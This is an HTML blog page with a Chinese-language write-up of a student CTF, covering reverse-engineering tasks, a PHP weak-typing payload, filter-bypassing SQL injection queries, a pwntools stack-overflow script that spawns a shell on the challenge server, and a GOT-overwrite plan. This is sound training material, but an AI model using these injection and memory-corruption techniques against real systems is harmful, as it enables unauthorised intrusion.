@@ -1,0 +1,1417 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next mist" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.1.1',
+    sidebar: {"position":"right","display":"always","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo 戳这里">
+<meta name="keywords" content="CTF,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小学期CTF Writeup">
+<meta property="og:url" content="https://www.hydewww.cn/CTF_ShortSemester/index.html">
+<meta property="og:site_name" content="Thorns All The Way">
+<meta property="og:description" content="第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo 戳这里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/try_1.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_1.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_2.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_1.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_2.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_3.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_4.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_5.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/getshell_1.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_1.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_2.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_3.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_6.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_5.png">
+<meta property="og:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_4.png">
+<meta property="og:updated_time" content="2017-09-23T16:00:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小学期CTF Writeup">
+<meta name="twitter:description" content="第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo 戳这里">
+<meta name="twitter:image" content="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/try_1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Thorns All The Way" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://www.hydewww.cn/CTF_ShortSemester/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>小学期CTF Writeup | Thorns All The Way</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Thorns All The Way</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">5</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">16</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-leetcode">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/algorithm/" rel="section"><i class="menu-item-icon fa fa-fw fa-code"></i> <br>Leetcode</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/hydewww" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.hydewww.cn/CTF_ShortSemester/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hydewww">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Thorns All The Way">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">小学期CTF Writeup
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2017-09-24 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-24T00:00:00+08:00">2017-09-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo <a href="https://github.com/hydewww/CTF-Writeup/tree/master/TSCTF_ShortSemester" target="_blank" rel="noopener">戳这里</a></p>
+<a id="more"></a>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>丢进ida，直接看到flag</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/try_1.png" alt="try_1"></p>
+<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>丢进ollydbg，找到如图</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_1.png" alt="snake_1"></p>
+<p>将撞墙后的retn改为jmp 003217F0后运行即可得flag</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_2.png" alt="snake_2"></p>
+<h2 id="Re-Again"><a href="#Re-Again" class="headerlink" title="Re Again"></a>Re Again</h2><p>这题用ida生成的伪代码似乎有问题(?)，由第一个do-while循环确定flag是24位的，其中由flag格式已知首尾是flag{…}。然后查了TryLevel发现是<strong>结构化异常处理 SEH</strong>相关的东西，然而还是看不懂，于是只能把伪码作为参考去啃汇编<strong>（图附注释）</strong>。</p>
+<p>main:</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_1.png" alt="re_again_main1"></p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_2.png" alt="re_again_main2"></p>
+<p>第二个函数（第一个函数类似）：</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_3.png" alt="re_again_except"></p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_4.png" alt="re_again_except2"></p>
+<p>大致看懂后丢进ollydbg用flag{123456789012345678}单步执行。由第二个函数的伪代码的函数声明和od跑一遍的逻辑，发现第一个函数似乎没用(?)，不影响eax的值，于是看第二个函数。</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_5.png" alt="re_again_except3"></p>
+<p>由于输入的flag前五位是正确的，所以会在里面循环五次后才跳出sorry，由此了解逻辑：第一个byte ptr取出的是字符”1”或”2”，第二个byte ptr依次取出flag的每一位字符，运算后与应得的值进行比较，正确则验证下一位，反向进行异或计算即可获得flag。</p>
+<p>做题时没想到可以直接拿到第二个断点处的数组(手动捂脸)，只能一位一位算，即用fla…算出后一位’g’，再用flag…重新运行算出’{‘ ……，逐位获得flag，python代码如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last = 0x72 # 第二个端点处取得的字符再颠倒</span><br><span class="line">one = 0x31	# 字符&quot;1&quot;</span><br><span class="line">two = 0x32	# 字符&quot;2&quot;</span><br><span class="line">flag = last ^ 0x7 ^ one	# 用1或2 取决于第一个断点处所得值</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="UnSafe-PHP"><a href="#UnSafe-PHP" class="headerlink" title="UnSafe PHP"></a>UnSafe PHP</h2><blockquote>
+<p>传闻PHP是世界上最好的语言，但方便的同时也带来了隐患，‘弱类型’就可能引发很多问题。</p>
+</blockquote>
+<p>考查php弱类型，根据提交的json在最下面显示输出，代码如下，注释里写过程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">include &quot;flag.php&quot;; </span><br><span class="line"></span><br><span class="line">$v1=0;$v2=0; </span><br><span class="line"></span><br><span class="line">$a=(array)json_decode(@$_GET[&apos;answer&apos;]); </span><br><span class="line"># 提交index.php?answer=&#123;&#125;</span><br><span class="line">if(is_array($a))&#123; </span><br><span class="line"># 读取$a时已转换成array，应该能通过</span><br><span class="line"></span><br><span class="line">    is_numeric(@$a[&quot;para1&quot;])?die(&quot;nope1&quot;):NULL; </span><br><span class="line">    if(@$a[&quot;para1&quot;])&#123; </span><br><span class="line">        ($a[&quot;para1&quot;]&gt;2016)?$v1=1:NULL; </span><br><span class="line">    &#125; </span><br><span class="line">	# $a[&quot;para1]既不是数又要大于2016</span><br><span class="line">	# 由php手册 http://php.net/manual/zh/language.operators.comparison.php</span><br><span class="line">	# 字符串和数值时比较会转换成数值，故应为含数值的字符串 </span><br><span class="line"></span><br><span class="line">    if(is_array(@$a[&quot;para2&quot;]))&#123; </span><br><span class="line">        if(count($a[&quot;para2&quot;])!==5 OR !is_array($a[&quot;para2&quot;][0])) die(&quot;nope2&quot;); </span><br><span class="line">		# a[&quot;para2&quot;]为含5个元素的数组，且第一个元素为数组</span><br><span class="line"></span><br><span class="line">        $pos = array_search(&quot;balabala&quot;, $a[&quot;para2&quot;]); </span><br><span class="line">        $pos===false?die(&quot;nope3&quot;):NULL; </span><br><span class="line">        foreach($a[&quot;para2&quot;] as $key=&gt;$val)&#123; </span><br><span class="line">            $val===&quot;balabala&quot;?die(&quot;nope4&quot;):NULL; </span><br><span class="line">        &#125; </span><br><span class="line">		# a[&quot;para2&quot;]中既要有balabala，又不能有balabala</span><br><span class="line">		# 根据php手册 http://php.net/manual/zh/function.array-search.php</span><br><span class="line">		# array_search()中字符串和数值比较同样有类型问题</span><br><span class="line">		# 即 &quot;balabala&quot;转化成数值应为0，故需有元素为0</span><br><span class="line"></span><br><span class="line">        $v2=1; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if($v1 &amp;&amp; $v2)&#123; </span><br><span class="line"></span><br><span class="line">    echo $flag; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最终payload：/index.php?answer={“para1”:”2017 “,”para2”:[[2],3,3,3,0]}</p>
+<h2 id="SQLinjection"><a href="#SQLinjection" class="headerlink" title="SQLinjection"></a>SQLinjection</h2><blockquote>
+<p>Hint2:测试的时候记得把’#’url编码</p>
+</blockquote>
+<p>在login，register，index中找到注入点在/index.php?id=1处，id=1-4组合起来是”hey there flag is in the database”。先用sqlmap跑了一遍，无果<em>(:з」∠)</em>，转而投奔手注。</p>
+<p>测试发现union,select,from,and,or,&amp;均被过滤(降低难度后union被放出)，用selselectect,frfromom，||解决。测试1’ || 1=1 #时报错，根据hint2将#改为%23后可通过。</p>
+<p>查阅网上wp后尝试表名列名均为flag，用id=-1’ union selselect flag frfromom flag%23竟然过了，<del>好像大家都是这么做出来的。（雾</del></p>
+<p>拿到flag后正经盲注，information里or用oorr绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 表名:flag,id,user</span><br><span class="line">id=-1&apos; union selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"># 列名:flag</span><br><span class="line">id=-1&apos; union selselectect group_concat(column_name) frfromom infoorrmation_schema.columns where table_name = &apos;flag&apos;%23</span><br><span class="line"></span><br><span class="line"># flag</span><br><span class="line">id=-1&apos; union selselectect flag frfromom flag%23</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/getshell_1.png" alt="getshell_1"></p>
+<p>看到pwn函数调用了system(“bin/sh”)，应该要跳转到这个地址。main里调用了gets()，故用v4覆写掉return的地址。</p>
+<p>python脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;10.105.40.215&quot;,4445)</span><br><span class="line">print p.recvuntil(&quot;name&quot;)</span><br><span class="line">payload = &quot;a&quot; * (0xa + 0x8) + p64(0x4006d6) # 程序为64位</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><blockquote>
+<p>Hint1:数组边界溢出</p>
+<p>Hint2:改写GOT表</p>
+</blockquote>
+<p><del>由上题权限漏洞可知此题flag（雾</del></p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_1.png" alt="array_main"></p>
+<p>根据hint1，发现name和数组a地址都在bss段。</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_2.png" alt="array_bss"></p>
+<p>根据hint2，查看got表地址，计算可得各函数的地址，如puts为a[-17]，printf为a[-18]。</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_3.png" alt="array_got"></p>
+<p>由第一题(Getshell)，猜测此题也是通过调用system(“bin/sh”)来拿到flag，将name设为“/bin/sh”，system地址覆写puts地址，即可在调用puts(name)时调用system(“bin/sh”)。</p>
+<p>然而got表没有system，经查阅得知函数地址是动态链接的，需通过已链接函数地址计算system地址，算式为system-libc_system=printf-libc_printf（用其他已调用函数也可行）。</p>
+<p>libc中函数地址可将libc.so.6丢进ida查看，后来得知也能通过gdb直接查找（下图）。printf函数因为在之前已经被调用过所以a[-18]显示的是链接后的地址，故本题有两次读写操作。</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_6.png" alt="array_readelf"></p>
+<p>同时，因为格式化字符串的%d，所以地址要用十进制进行操作。</p>
+<p>故解题过程为：</p>
+<ol>
+<li>将/bin/sh写入name</li>
+<li>读取a[-18]，即已知的printf动态地址。</li>
+<li>由system=printf-libc_printf+libc_system计算出system的动态地址</li>
+<li>将十进制的地址写入a[-17]，即要调用的puts()函数的地址</li>
+<li>调用puts(name)时，实际调用system(“/bin/sh”)，getshell。</li>
+</ol>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_5.png" alt="array_ans"></p>
+<p>P.S. 题目附带的libc文件是服务器的libc库，本地测试时调用的是本地的库，本地libc库位置可通过gdb中查看，如下图。</p>
+<p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_4.png" alt="array_libc"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>hydewww</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://www.hydewww.cn/CTF_ShortSemester/" title="小学期CTF Writeup">https://www.hydewww.cn/CTF_ShortSemester/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/frp/" rel="next" title="frp实现内网穿透+开机自启">
+                <i class="fa fa-chevron-left"></i> frp实现内网穿透+开机自启
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/padavan-ftp/" rel="prev" title="借助padavan搭建ftp">
+                借助padavan搭建ftp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">hydewww</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/hydewww" title="GitHub &rarr; https://github.com/hydewww" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:hydewwwww@gmail.com" title="E-Mail &rarr; mailto:hydewwwww@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">1.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Try"><span class="nav-number">1.1.</span> <span class="nav-text">Try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Snake"><span class="nav-number">1.2.</span> <span class="nav-text">Snake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-Again"><span class="nav-number">1.3.</span> <span class="nav-text">Re Again</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UnSafe-PHP"><span class="nav-number">2.1.</span> <span class="nav-text">UnSafe PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLinjection"><span class="nav-number">2.2.</span> <span class="nav-text">SQLinjection</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span 